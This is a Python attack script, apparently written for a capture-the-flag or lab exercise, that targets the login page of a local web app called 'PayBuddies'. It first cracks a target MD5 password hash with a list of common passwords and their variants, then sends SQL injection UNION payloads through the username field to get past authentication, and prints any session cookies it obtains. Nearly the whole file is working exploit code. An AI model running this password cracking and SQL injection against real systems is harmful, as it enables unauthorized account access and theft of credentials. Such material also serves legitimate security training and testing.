import requests
import hashlib

# Target hash from context
target_hash = "7d39307ae824e70052c0aa16816a9b16"

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

print("[*] Strategy: Inject admin user with the actual target hash")
print(f"[*] Target hash: {target_hash}")
print("[*] We'll try to login with a password that matches this hash")
print()

# First, let's try to crack more passwords
common_passwords = [
    'paybuddies', 'PayBuddies', 'PAYBUDDIES',
    'buddy', 'Buddy', 'BUDDY',
    'paybuddy', 'PayBuddy', 'PAYBUDDY',
    'password', 'Password', 'PASSWORD',
    'admin', 'Admin', 'ADMIN',
    '123456', 'password123', 'admin123',
    'welcome', 'Welcome', 'WELCOME',
    'qwerty', 'letmein', 'monkey',
    'dragon', 'master', 'superman',
    'trustno1', '111111', '1234567890',
    'payroll', 'Payroll', 'PAYROLL',
    'pay2024', 'buddy123', 'paybuddy123',
    'iloveyou', 'princess', 'rockyou',
    'abc123', 'password1', 'qwerty123'
]

# Extend with more variations
extended_passwords = []
for pwd in common_passwords:
    extended_passwords.append(pwd)
    extended_passwords.append(pwd + '!')
    extended_passwords.append(pwd + '123')
    extended_passwords.append(pwd + '1')
    extended_passwords.append(pwd + '@')
    extended_passwords.append('1' + pwd)

print(f"[*] Testing {len(extended_passwords)} passwords against hash...")

for pwd in extended_passwords:
    hash_val = hashlib.md5(pwd.encode()).hexdigest()
    if hash_val == target_hash:
        print(f"\n[!] PASSWORD CRACKED: {pwd}")
        print(f"[!] Hash: {hash_val}")
        
        # Now try to login with this password
        print(f"\n[*] Attempting login with username=admin, password={pwd}")
        data = {
            "username": "admin",
            "password": pwd,
            "submit": "submit"
        }
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"[*] Response: {response.text}")
        break
else:
    print("[-] No match found in extended password list")

# Now try UNION with the actual target hash and various test passwords
print("\n" + "="*60)
print("[*] UNION injection with target hash and test passwords")
print("="*60)

# We'll inject a row where password field = target_hash, and try different passwords
test_passwords = ['password', 'admin', 'test', '123456', 'letmein', 'qwerty']

for test_pwd in test_passwords:
    # Calculate hash of test password
    test_hash = hashlib.md5(test_pwd.encode()).hexdigest()
    
    union_payloads = [
        f"' UNION SELECT 1,'admin','{test_hash}'-- ",
        f"' UNION SELECT 'admin','{test_hash}',1-- ",
        f"' UNION SELECT NULL,'admin','{test_hash}'-- ",
    ]
    
    for username_sqli in union_payloads:
        data = {
            "username": username_sqli,
            "password": test_pwd,
            "submit": "submit"
        }
        
        try:
            response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            
            if response.text != '{"response":"username"}':
                print(f"\n[*] Different response for password={test_pwd}")
                print(f"[*] Payload: {username_sqli[:50]}...")
                print(f"[*] Response: {response.text}")
                
                if "Success" in response.text or "success" in response.text.lower():
                    print("[!] AUTHENTICATION BYPASS SUCCESSFUL!")
                    if response.cookies:
                        print(f"[!] Cookies: {response.cookies.get_dict()}")
                    break
                    
        except Exception as e:
            print(f"[-] Error: {e}")

print("\n[*] Script complete")

